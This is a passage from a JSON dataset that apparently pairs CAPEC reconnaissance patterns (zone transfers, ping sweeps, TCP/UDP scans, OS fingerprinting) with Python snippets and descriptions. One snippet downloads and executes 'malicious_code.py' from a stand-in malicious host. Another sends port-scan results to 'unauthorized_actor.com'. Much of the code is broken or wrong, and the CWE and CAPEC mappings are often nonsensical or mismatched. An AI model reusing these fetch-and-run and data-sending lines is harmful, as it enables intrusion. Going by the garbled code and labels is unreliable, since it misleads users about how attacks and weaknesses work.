        "code_snippet": "import dns.resolver\n\ndef get_mx_records(domain):\n    try:\n        answers = dns.resolver.resolve(domain, 'MX')\n        mx_records = {}\n        for rdata in answers:\n            mx_records[rdata.exchange] = rdata.preference\n        return mx_records\n    except dns.resolver.NoAnswer:\n        return {}\n\ndef get_ip_address(host):\n    try:\n        answers = dns.resolver.resolve(host, 'A')\n        ip_address = answers[0].address\n        return ip_address\n    except dns.resolver.NoAnswer:\n        return None\n\ndef main):\n    domain = 'example.com'\n    mx_records = get_mx_records(domain)\n    for host in mx_records:\n        ip_address = get_ip_address(host)\n        if ip_address:\n            print(f'MX Record: {host} - IP Address: {ip_address}')\n",
        "description": "This Python code snippet demonstrates the CAPEC of enumerating MX records for a given domain via a DNS query, which can potentially reveal the IP address of the firewall or other internal systems. The code uses the dns.resolver module to query the DNS server for MX records and then resolves the hostname to an IP address using a reverse DNS lookup. This code embodies CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) as it exposes the IP address of internal systems, CWE-350 (Reliance on Reverse DNS Resolution for a Security-Critical Action) as it relies on reverse DNS resolution to obtain the IP address, CWE-224 (Obscured Security-relevant Information by Alternate Name) as it uses the MX record hostname instead of the canonical name, CWE-941 (Incorrectly Specified Destination in a Communication Channel) as it does not correctly specify the intended destination for the DNS query, and CWE-223 (Omission of Security-relevant Information) as it does not record or display information that would be important for identifying the source or nature of an attack."
    },
    {
        "capec_id": "291",
        "capec_name": "DNS Zone Transfers",
        "code_snippet": "import dns.resolver\n\ndef zone_transfer(domain):\n    try:\n        result = dns.resolver.resolve(domain, 'AXFR')\n        for rdata in result:\n            for rr in rdata:\n                print(rr)\n    except Exception as e:\n        print(f'Error: {e}')\n\n# Example usage\nzone_transfer('example.com')",
        "description": "This Python code snippet demonstrates a DNS zone transfer attack, which exploits a misconfigured DNS server to obtain sensitive information about the target organization's internal network. The code uses the 'dns.resolver' module to perform a zone transfer (AXFR) request on the specified domain. If successful, it will print out the obtained DNS records, which may include IP addresses, hostnames, and other sensitive information. This code embodies CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) and CWE-350 (Reliance on Reverse DNS Resolution for a Security-Critical Action), as it relies on the DNS server's misconfiguration to obtain unauthorized access to sensitive information."
    },
    {
        "capec_id": "292",
        "capec_name": "Host Discovery",
        "code_snippet": "import os\nimport socket\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-291: Reliance on IP Address for Authentication\n# CWE-319: Cleartext Transmission of Sensitive Information\n\ndef ping_sweep(ip_range):\n    for ip in ip_range:\n        try:\n            # CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action\n            hostname = socket.gethostbyaddr(ip)[0]\n            print(f\"{ip} is alive and resolves to {hostname}\")\n        except socket.herror:\n            print(f\"{ip} is not alive or does not resolve\")\n\n# CWE-509: Replicating Malicious Code (Virus or Worm)\n# This is a simple example of a malicious code that replicates itself\n# In a real-world scenario, this would be a more sophisticated attack\n\ndef replicate_malicious_code(ip):\n    # Send a malicious packet to the IP address\n    os.system(f\"ping -c 1 {ip}\")\n\n# Example usage\nip_range = [\"192.168.1.\" + str(i) for i in range(1, 256)]\nping_sweep(ip_range)\n",
        "description": "This Python code snippet demonstrates a ping sweep attack, which is a type of host discovery attack. It sends ICMP echo request packets to a range of IP addresses to determine if a host is alive. The code also includes examples of CWEs 200, 291, 319, 350, and 509, which are related to the CAPEC. Note that this code is for educational purposes only and should not be used for malicious activities."
    },
    {
        "capec_id": "293",
        "capec_name": "Traceroute Route Enumeration",
        "code_snippet": "import os\nimport socket\nimport struct\nimport time\n\ndef traceroute(target, max_hops=30, timeout=1):\n    for ttl in range(1, max_hops + 1):\n        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n        s.setsockopt(socket.SOL_IP, socket.IP_TTL, ttl)\n        packet = struct.pack('!BBHHH', 8, 0, 0, 1, 49711) + b'\\x00' * 56\n        s.sendto(packet, (target, 0))\n        s.settimeout(timeout)\n        try:\n            response = s.recvfrom(1024)[0]\n            icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq = struct.unpack('!BBHHH', response[:8])\n            if icmp_type == 0:\n                print(f'Received ICMP echo reply from {target} with TTL {ttl}')\n                break\n            elif icmp_type == 11:\n                print(f'Received ICMP time exceeded message from {target} with TTL {ttl}')\n        except socket.timeout:\n            print(f'Received no response from {target} with TTL {ttl}')\n        s.close()\n\ntraceroute('example.com')",
        "description": "This Python code snippet demonstrates a basic implementation of the CAPEC attack, using the traceroute utility to map out the route to a target destination. The code sends ICMP echo request packets to the target with incrementing TTL values, and analyzes the responses to construct a working topology of systems and routers. The code is vulnerable to CWE-200, CWE-319, CWE-497, and CWE-941, as it transmits sensitive information in cleartext, exposes system information, and does not properly specify the intended destination."
    },
    {
        "capec_id": "294",
        "capec_name": "ICMP Address Mask Request",
        "code_snippet": "import socket\nimport icmp\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-291: Reliance on IP Address for Authentication\n# CWE-1316: Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges\n# CWE-1327: Binding to an Unrestricted IP Address\n# CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n\n# Create a raw socket to send ICMP packets\nsock = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp.ICMP_PROTOCOL)\n\n# Set the destination IP address (CWE-1327)\ndst_ip = '0.0.0.0'\n\n# Create an ICMP type 17 Address Mask Request packet\nicmp_pkt = icmp.ICMP()\nicmp_pkt.icmp_type = 17\nicmp_pkt.icmp_code = 0\n\n# Send the ICMP packet to the destination IP address\nsock.sendto(icmp_pkt.pack(), (dst_ip, 0))\n\n# Receive the ICMP type 18 Address Mask Reply packet\nicmp_reply_pkt = sock.recv(1024)\n\n# Extract the subnet information from the reply packet\nsubnet_info = icmp_reply_pkt[icmp.ICMP_MINLEN:]\n\n# Print the subnet information (CWE-200)\nprint('Subnet information:', subnet_info)\n",
        "description": "This Python code snippet demonstrates the CAPEC-11 attack, where an adversary sends an ICMP Type 17 Address Mask Request to gather information about a target's networking configuration. The code creates a raw socket, sets the destination IP address to 0.0.0.0 (CWE-1327), and sends an ICMP type 17 packet. It then receives the ICMP type 18 Address Mask Reply packet and extracts the subnet information, which is then printed (CWE-200). The code also relates to CWE-291, CWE-1316, and CWE-923, as it relies on IP addresses for authentication, has overlapping protected and unprotected regions, and establishes a communication channel without proper endpoint verification."
    },
    {
        "capec_id": "295",
        "capec_name": "Timestamp Request",
        "code_snippet": "import time\nimport requests\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-208: Observable Timing Discrepancy\n# CWE-385: Covert Timing Channel\n# CWE-294: Authentication Bypass by Capture-replay\n# CWE-598: Use of GET Request Method With Sensitive Query Strings\n\ndef get_timestamp(url):\n    start_time = time.time()\n    response = requests.get(url, params={'sensitive_info': 'secret_data'})\n    end_time = time.time()\n    timestamp = end_time - start_time\n    return timestamp\n\n# Example usage:\nurl = 'https://example.com/authenticate'\nprint(get_timestamp(url))",
        "description": "This Python code snippet demonstrates the CAPEC pattern of attack, which involves using standard requests to learn the exact time associated with a target system. The code sends a GET request with sensitive information in the query string (CWE-598) and measures the time it takes for the response. An adversary can use this timestamp to attack time-based security algorithms or authentication mechanisms (CWE-294). The code also exposes sensitive information to an unauthorized actor (CWE-200) and reveals security-relevant information through observable timing discrepancies (CWE-208). Furthermore, it conveys information through a covert timing channel (CWE-385)."
    },
    {
        "capec_id": "296",
        "capec_name": "ICMP Information Request",
        "code_snippet": "import socket\n\nicmp_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n\nicmp_socket.bind((\"0.0.0.0\", 0))\n\nicmp_socket.setsockopt(socket.SOL_IP, socket.IP_HDRINCL, 1)\n\nicmp_packet = b'\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\x11'\n\nicmp_socket.sendto(icmp_packet, (\"192.168.1.1\", 0))\n\nresponse, addr = icmp_socket.recvfrom(1024)\n\nprint(\"Received response from \", addr[0], \":\", response)\n",
        "description": "Python code snippet that sends an ICMP Information Request packet to a host and prints the received response, potentially exposing sensitive information about the host's network configuration."
    },
    {
        "capec_id": "297",
        "capec_name": "TCP ACK Ping",
        "code_snippet": "import socket\n\ndef send_ack_ping(host, port):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    s.bind((\"0.0.0.0\", 0))\n    s.connect((host, port))\n    s.send(b\"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x50\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\")\n    response = s.recv(1024)\n    if response:\n        print(\"Host is alive\")\n    else:\n        print(\"Host is not alive\")\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-605: Multiple Binds to the Same Port\n# CWE-828: Signal Handler with Functionality that is not Asynchronous-Safe\n# CWE-1276: Hardware Child Block Incorrectly Connected to Parent System\n# CWE-319: Cleartext Transmission of Sensitive Information\n\nhost = \"example.com\"\nport = 80\nsend_ack_ping(host, port)",
        "description": "This Python code snippet demonstrates a TCP ACK ping attack, which sends an ACK packet to a remote host to determine if it is alive. The code creates a socket, binds it to a random port, connects to the target host and port, and sends an ACK packet. The response is then checked to determine if the host is alive. The code also includes comments referencing related CWEs, which highlight potential security risks in the code."
    },
    {
        "capec_id": "298",
        "capec_name": "UDP Ping",
        "code_snippet": "import socket\nimport random\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n# CWE-605: Multiple Binds to the Same Port\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-1320: Improper Protection for Outbound Error Messages and Alert Signals\n\ndef udp_ping(host, port):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    sock.bind((\"\", port))  # CWE-605: Multiple Binds to the Same Port\n    sock.sendto(b\"ping\", (host, port))\n    try:\n        sock.settimeout(1)\n        sock.recvfrom(1024)\n    except socket.timeout:\n        pass\n    finally:\n        sock.close()\n\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-1320: Improper Protection for Outbound Error Messages and Alert Signals\nhost = \"192.168.1.1\"\nport = random.randint(49152, 65535)\nudp_ping(host, port)\n",
        "description": "Python code snippet that demonstrates a UDP ping attack, which sends a UDP datagram to a random high port on the target host to solicit an 'ICMP port unreachable' message, indicating that the host is alive. The code includes vulnerabilities related to exposure of sensitive information, incorrectly specified destination, multiple binds to the same port, cleartext transmission of sensitive information, and improper protection for outbound error messages and alert signals."
    },
    {
        "capec_id": "299",
        "capec_name": "TCP SYN Ping",
        "code_snippet": "import socket\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-605: Multiple Binds to the Same Port\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-444: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n\ndef send_syn_packet(host, port):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.bind((\"0.0.0.0\", 8080))  # CWE-605: Multiple Binds to the Same Port\n    sock.connect((host, port))\n    syn_packet = b\"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    sock.send(syn_packet)\n    response = sock.recv(1024)\n    if response[12:14] == b\"\\x12\\x04\":  # CWE-444: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')\n        print(\"Port is open\")\n    elif response[12:14] == b\"\\x14\\x03\":\n        print(\"Port is closed\")\n    else:\n        print(\"Unknown response\")\n\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\nhost = \"example.com\"\nport = 80\nsend_syn_packet(host, port)\n",
        "description": "This Python code snippet demonstrates the CAPEC of using TCP SYN packets for host discovery, which can be used to identify open or closed ports on a target system. The code includes vulnerabilities related to CWE-200, CWE-605, CWE-319, CWE-444, and CWE-924, such as exposing sensitive information, allowing multiple binds to the same port, transmitting sensitive information in cleartext, and inconsistent interpretation of HTTP requests."
    },
    {
        "capec_id": "300",
        "capec_name": "Port Scanning",
        "code_snippet": "import socket\nimport requests\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-605: Multiple Binds to the Same Port\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\n# CWE-918: Server-Side Request Forgery (SSRF)\n\nport_scanner = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# Scan for open ports on the target system\nfor port in range(1, 1025):\n    try:\n        port_scanner.connect(('target_system', port))\n        print(f'Port {port} is open')\n        # CWE-200: Send sensitive information to an unauthorized actor\n        requests.post('http://unauthorized_actor.com', data={'port': port})\n        # CWE-605: Bind to the same port multiple times\n        socket.socket(socket.AF_INET, socket.SOCK_STREAM).bind(('localhost', port))\n        # CWE-319: Transmit sensitive information in cleartext\n        requests.get(f'http://target_system:{port}/sensitive_data', verify=False)\n        # CWE-1313: Activate test or debug logic at runtime\n        requests.post(f'http://target_system:{port}/debug', data={'activate_test_logic': True})\n        # CWE-918: Perform SSRF to retrieve contents from an unexpected destination\n        requests.get(f'http://target_system:{port}/ssrf?url=http://unexpected_destination.com')\n    except socket.error:\n        print(f'Port {port} is closed')",
        "description": "This Python code snippet demonstrates a port scanner that scans for open ports on a target system and exploits various vulnerabilities, including exposure of sensitive information, multiple binds to the same port, cleartext transmission of sensitive information, activation of test or debug logic at runtime, and server-side request forgery."
    },
    {
        "capec_id": "301",
        "capec_name": "TCP Connect Scan",
        "code_snippet": "import socket\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-291: Reliance on IP Address for Authentication\n\ndef is_port_open(ip, port):\n    try:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.connect((ip, port))\n        sock.close()\n        return True\n    except socket.error:\n        return False\n\n# CWE-605: Multiple Binds to the Same Port\n# CWE-617: Reachable Assertion\n\ndef bind_to_port(ip, port):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    assert sock.bind((ip, port)) == None\n    return sock\n\n# CWE-353: Missing Support for Integrity Check\n\ndef send_data(sock, data):\n    sock.send(data.encode())\n\n# TCP connect scanning\n\nip = '192.168.1.1'\nport = 80\n\nif is_port_open(ip, port):\n    sock = bind_to_port(ip, port)\n    send_data(sock, 'GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n')\n    print('Port is open')\nelse:\n    print('Port is closed')",
        "description": "This Python code snippet demonstrates a TCP connect scanning attack, which involves completing a three-way handshake with a remote port to determine if it is open. The code includes vulnerabilities related to exposure of sensitive information, reliance on IP address for authentication, multiple binds to the same port, reachable assertion, and missing support for integrity check."
    },
    {
        "capec_id": "302",
        "capec_name": "TCP FIN Scan",
        "code_snippet": "import socket\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-353: Missing Support for Integrity Check\n# CWE-605: Multiple Binds to the Same Port\n# CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n\ndef scan_port(ip, port):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    # CWE-605: Multiple Binds to the Same Port\n    sock.bind((ip, port))\n    sock.listen(1)\n    conn, addr = sock.accept()\n    # CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n    # No verification of the endpoint\n    conn.send(b\"FIN\")\n    response = conn.recv(1024)\n    if response == b\"RST\":\n        print(f\"Port {port} is closed\")\n    else:\n        print(f\"Port {port} is open\")\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-353: Missing Support for Integrity Check\n# Scan for closed ports\nfor port in range(1, 1024):\n    scan_port(\"192.168.1.1\", port)",
        "description": "Python code snippet that demonstrates a TCP FIN scan to determine if ports are closed on a target machine, exploiting CWE-200, CWE-319, CWE-353, CWE-605, and CWE-923."
    },
    {
        "capec_id": "303",
        "capec_name": "TCP Xmas Scan",
        "code_snippet": "import socket\n\ndef send_xmas_scan(ip, port):\n    try:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(1)\n        packet = bytearray([0x12, 0x34, 0x00, 0x50, 0x00, 0x00, 0x00, 0x00, 0x50, 0x02, 0x02, 0x00, 0x00, 0x00, 0x00, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f, 0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29, 0x2a, 0x2b, 0x2c, 0x2d, 0x2e, 0x2f, 0x30, 0x31, 0x32, 0x33])\n        sock.sendto(packet, (ip, port))\n        response = sock.recv(1024)\n        if response:\n            print(f\"Port {port} is closed\")\n        else:\n            print(f\"Port {port} is open\")\n    except socket.error:\n        print(f\"Error scanning port {port}\")\n\n# Example usage\nsend_xmas_scan(\"192.168.1.1\", 80)",
        "description": "This Python code snippet demonstrates a TCP XMAS scan, which sends a TCP segment with all possible flags set in the packet header to determine if a port is closed on the target machine. The code uses the socket library to create a TCP socket, set a timeout, and send the crafted packet to the target IP and port. It then receives the response and checks if it's a RST packet, indicating a closed port. The code is vulnerable to CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor), CWE-353 (Missing Support for Integrity Check), CWE-319 (Cleartext Transmission of Sensitive Information), CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints), and CWE-924 (Improper Enforcement of Message Integrity During Transmission in a Communication Channel) as it transmits sensitive information in cleartext, lacks integrity checks, and does not properly ensure the communication channel is with the correct endpoint."
    },
    {
        "capec_id": "304",
        "capec_name": "TCP Null Scan",
        "code_snippet": "import socket\n\ndef send_tcp_null_scan(ip, port):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)\n    packet = bytearray([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])\n    s.sendto(packet, (ip, port))\n    response = s.recvfrom(1024)\n    if response:\n        if response[0][0:2] == b'\\x14\\x04':\n            print(f'Port {port} is closed')\n        else:\n            print(f'Port {port} is open')\n    else:\n        print(f'No response from port {port}')\n\n# Example usage:\nhost = '192.168.1.1'\nport = 22\nsend_tcp_null_scan(host, port)\n",
        "description": "This Python code snippet demonstrates a TCP NULL scan, which sends a TCP segment with no flags to a target machine to determine if a port is closed. The code creates a raw TCP packet with no flags, sends it to the target IP and port, and analyzes the response. If the response is a RST packet, it indicates that the port is closed. The code is vulnerable to CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor), CWE-353 (Missing Support for Integrity Check), CWE-319 (Cleartext Transmission of Sensitive Information), CWE-690 (Unchecked Return Value to NULL Pointer Dereference), and CWE-476 (NULL Pointer Dereference) due to the lack of error handling, integrity checks, and secure transmission protocols."
    },
    {
        "capec_id": "305",
        "capec_name": "TCP ACK Scan",
        "code_snippet": "import socket\nimport os\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\nfirewall_config = {'allowed_ips': ['192.168.1.1', '10.0.0.1'], 'blocked_ips': ['8.8.8.8']}\n\n# CWE-1280: Access Control Check Implemented After Asset is Accessed\ndef access_control_check(ip):\n    if ip in firewall_config['allowed_ips']:\n        return True\n    else:\n        return False\n\n# CWE-605: Multiple Binds to the Same Port\nport = 8080\nsocket.bind(('0.0.0.0', port))\n\n# CWE-319: Cleartext Transmission of Sensitive Information\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect(('example.com', 80))\ndata = s.recv(1024)\ns.sendall(b'GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n')\n\n# CWE-529: Exposure of Access Control List Files to an Unauthorized Control Sphere\nacl_file = 'acl.txt'\nwith open(acl_file, 'w') as f:\n    f.write('allowed_ips = {}\nblocked_ips = {}'.format(firewall_config['allowed_ips'], firewall_config['blocked_ips']))\n\n# CAPEC: TCP ACK Scan\nfor ip in ['192.168.1.1', '10.0.0.1', '8.8.8.8']:\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((ip, port))\n    s.sendall(b'\\x06\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x50\\x02\\x20\\x00\\x00\\x00\\x00\\x00\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f')\n    response = s.recv(1024)\n    if response:\n        print('Firewall configuration for {} allows access.'.format(ip))\n    else:\n        print('Firewall configuration for {} blocks access.'.format(ip))",
        "description": "This Python code snippet demonstrates a TCP ACK scan to gather information about firewall or ACL configuration. It includes vulnerabilities related to exposure of sensitive information, inadequate access control checks, multiple binds to the same port, cleartext transmission of sensitive information, and exposure of access control list files to unauthorized actors."
    },
    {
        "capec_id": "306",
        "capec_name": "TCP Window Scan",
        "code_snippet": "import socket\n\ndef send_tcp_packet(dst_ip, dst_port, window_size):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.setsockopt(socket.SOL_TCP, socket.TCP_WINDOW_CLAMP, window_size)\n    sock.connect((dst_ip, dst_port))\n    sock.send(b'\\x00')\n    response = sock.recv(1024)\n    if response[13] == 0x04:  # RST packet\n        if response[14] > 0:  # Positive TCP window size\n            print(f'Port {dst_port} is open on {dst_ip}')\n        else:  # Negative TCP window size\n            print(f'Port {dst_port} is closed on {dst_ip}')\n    sock.close()\n\n# Example usage:\nfor port in range(1, 1024):\n    send_tcp_packet('192.168.1.100', port, 1024)\n",
        "description": "This Python code snippet demonstrates a TCP Window scanning technique to analyze port status and operating system type. It sends a TCP packet with a specific window size to a target IP and port, and then analyzes the response RST packet to make inferences about the port status. The code is vulnerable to CWE-200, CWE-319, CWE-497, CWE-353, and CWE-385 as it transmits sensitive information in cleartext, exposes system-level information, and lacks integrity checks."
    },
    {
        "capec_id": "307",
        "capec_name": "TCP RPC Scan",
        "code_snippet": "import socket\nimport os\nimport urllib.request\nimport base64\n\n# CWE-200: Exposure of Sensitive Information\nrpc_services = ['rpcbind', 'rpc.statd', 'rpc.mountd']\nfor service in rpc_services:\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.bind(('0.0.0.0', 111))  # CWE-605: Multiple Binds to the Same Port\n    sock.listen(1)\n    print(f'RPC service {service} is listening on port 111')\n\n# CWE-294: Authentication Bypass by Capture-replay\nauth_token = 'captured_auth_token'\nbase64_auth_token = base64.b64encode(auth_token.encode()).decode()\nheaders = {'Authorization': f'Basic {base64_auth_token}'}\nreq = urllib.request.Request('http://localhost:111', headers=headers)\nresponse = urllib.request.urlopen(req)\nprint(response.read().decode())\n\n# CWE-494: Download of Code Without Integrity Check\nos.system('wget http://malicious-website.com/malicious_code.py -O /tmp/malicious_code.py')\nos.system('python /tmp/malicious_code.py')\n\n# CWE-918: Server-Side Request Forgery (SSRF)\nssrf_url = 'http://localhost:111/rpc'\nreq = urllib.request.Request(ssrf_url)\nresponse = urllib.request.urlopen(req)\nprint(response.read().decode())",
        "description": "Python code snippet that scans for RPC services listing on a Unix/Linux host, demonstrating vulnerabilities related to exposure of sensitive information, authentication bypass, download of code without integrity check, and server-side request forgery."
    },
    {
        "capec_id": "308",
        "capec_name": "UDP Scan",
        "code_snippet": "import socket\nimport icmp\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-605: Multiple Binds to the Same Port\nudp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\nudp_socket.bind((\"0.0.0.0\", 12345))\n\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-353: Missing Support for Integrity Check\n# CWE-385: Covert Timing Channel\nfor port in range(1, 65536):\n    udp_socket.sendto(b\"probe\", (\"target_ip\", port))\n    response = icmp.ICMP().request_echo_reply(\"target_ip\", port)\n    if response:\n        print(f\"UDP port {port} is open\")\n    else:\n        print(f\"UDP port {port} is closed\")",
        "description": "Python code snippet that performs UDP scanning to gather information about UDP port status on the target system, using ICMP diagnostic messages to determine the status of a remote port. The code binds to a UDP port, sends UDP datagrams to the target port, and looks for evidence that the port is closed. The code also demonstrates CWE-200, CWE-605, CWE-319, CWE-353, and CWE-385."
    },
    {
        "capec_id": "309",
        "capec_name": "Network Topology Mapping",
        "code_snippet": "import os\nimport socket\nimport subprocess\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n\n# Get the current system's IP address\nip_address = socket.gethostbyname(socket.gethostname())\nprint(f\"Current System IP: {ip_address}\")\n\n# CWE-1125: Excessive Attack Surface\n# Perform a port scan on the local network\nfor port in range(1, 1025):\n    try:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.connect((ip_address, port))\n        print(f\"Port {port} is open\")\n    except socket.error:\n        pass\n\n# CWE-1323: Improper Management of Sensitive Trace Data\n# Run the traceroute command to gather network route information\ntraceroute_output = subprocess.check_output([\"traceroute\", ip_address])\nprint(traceroute_output.decode())\n\n# CWE-1292: Incorrect Conversion of Security Identifiers\n# Incorrectly convert security identifiers (e.g., bus-transaction signals)\n# This is a hypothetical example and may not be applicable in a real-world scenario\nsecurity_identifier = 0x1234\nuntrusted_agent_input = 0x5678\nif security_identifier == untrusted_agent_input:\n    print(\"Unauthorized access granted\")",
        "description": "This Python code snippet demonstrates a network reconnaissance attack, which involves scanning the local network to gather sensitive information. It exposes sensitive system information, performs a port scan, and gathers network route information using the traceroute command. Additionally, it includes an example of incorrect conversion of security identifiers, which could lead to unauthorized access."
    },
    {
        "capec_id": "310",
        "capec_name": "Scanning for Vulnerable Software",
        "code_snippet": "import socket\nimport telnetlib\nimport smtplib\nimport ftplib\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n\n# Scan for open ports and services\nport_scan = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nport_scan.connect(('target_ip', 21))  # FTP\nport_scan.connect(('target_ip', 23))  # Telnet\nport_scan.connect(('target_ip', 25))  # SMTP\nport_scan.connect(('target_ip', 161))  # SNMP\n\n# CWE-506: Embedded Malicious Code\n# CWE-319: Cleartext Transmission of Sensitive Information\n\n# Establish unencrypted connections to vulnerable services\nftp_conn = ftplib.FTP()\nftp_conn.connect('target_ip', 21)\nftp_conn.login('anonymous', 'password')\n\nsmtp_conn = smtplib.SMTP('target_ip', 25)\nsmtp_conn.sendmail('attacker@example.com', 'victim@example.com', 'Malicious email')\n\ntelnet_conn = telnetlib.Telnet('target_ip', 23)\n\n# CWE-1125: Excessive Attack Surface\n\n# Perform excessive scanning and probing to identify vulnerabilities\nfor port in range(1, 65536):\n    port_scan.connect(('target_ip', port))",
        "description": "Python code snippet demonstrating a CAPEC-209 attack, where an attacker scans for vulnerable software versions or types, such as operating system versions or network services, and exploits them. The code includes CWE-200, CWE-497, CWE-506, CWE-319, and CWE-1125 vulnerabilities, making it a highly exploitable and insecure piece of code."
    },
    {
        "capec_id": "311",
        "capec_name": "DEPRECATED: OS Fingerprinting",
        "code_snippet": "import socket\nimport os\nimport logging\n\n# CWE-592: Authentication Bypass Issues\n# CWE-1316: Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges\n# CWE-589: Call to Non-ubiquitous API\n# CWE-534: Information Exposure Through Debug Log Files\n# CWE-1191: On-Chip Debug and Test Interface With Improper Access Control\n\n# Active OS Fingerprinting (CAPEC-312)\ndef get_os_info():\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.connect(('127.0.0.1', 80))\n        os_info = s.recv(1024)\n        s.close()\n        return os_info\n    except Exception as e:\n        logging.debug('Error getting OS info: %s' % str(e))\n        return None\n\n# CWE-589: Call to Non-ubiquitous API\n# Using an API function that does not exist on all versions of the target platform\ntry:\n    import winreg\n    winreg.ExpandEnvironmentStrings('%SystemRoot%')\nexcept ImportError:\n    pass\n\n# CWE-534: Information Exposure Through Debug Log Files\n# Logging sensitive information\nlogging.basicConfig(filename='debug.log', level=logging.DEBUG)\nlogging.debug('OS Info: %s' % get_os_info())",
        "description": "This Python code snippet demonstrates active OS fingerprinting (CAPEC-312) by attempting to connect to a local web server and retrieve OS information. It also includes examples of CWE-592, CWE-1316, CWE-589, CWE-534, and CWE-1191, such as using an API function that does not exist on all versions of the target platform, exposing sensitive information through debug log files, and improper access control to internal registers and test modes."
    },
    {
        "capec_id": "312",
        "capec_name": "Active OS Fingerprinting",
